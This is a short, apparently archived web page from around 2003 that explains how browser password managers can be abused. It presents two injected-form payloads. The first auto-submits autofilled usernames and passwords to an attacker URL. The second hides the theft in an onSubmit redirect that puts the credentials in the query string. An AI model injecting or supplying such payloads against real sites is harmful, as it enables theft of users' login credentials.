<title>Abusing Password Management</title>
</head><body>[Note] This information may be significantly outdated. Site referenced from 2003.<br/>
<br/>
Usernames and passwords are stored in a database for the password manager to access. When a domain is visited with a login form (forms containing a field with the type password) the management system is checked for matching records. For a record to be a match, the domain and field names must be the same in the database and the visited page. If a match is returned it is then entered on the form automatically.<br/>
<br/>
Jump code may be formed to exploit the weak password management system and send clear text logins and passwords to the payload script.<br/>
<br/>
&lt;form name=form1 method=POST action=”http://attacker/payload”&gt;<br/>
&lt;input type=text name=username&gt;<br/>
&lt;input type=password name=password&gt;<br/>
&lt;/form&gt;<br/>
&lt;script&gt;form1.submit()&lt;/script&gt;<br/>
<br/>
When the above code is injected the password management system will automatically complete the username and password fields in the form. As the action is not verified, the username and password are sent unencrypted directly to the payload script.<br/>
<br/>
Verification of the action is still inadequate. A crafty attacker could insert an e onSubmit function into the form.<br/>
<br/>
&lt;form name=form1 method=POST action=”http://host/script” onSubmit=”document.location.replace('http://attacker/payload?u='+document.form1.username.value+'&amp;p='+document.form1.password.value)”&gt;<br/>
&lt;input type=text name=username&gt;<br/>
&lt;input type=password name=password&gt;<br/>
&lt;/form&gt;<br/>
&lt;script&gt;form1.submit()&lt;/script&gt;<br/>
<br/>
In this example nothing is changed with the original form, the onSubmit method is the only inserted code.</body></html>
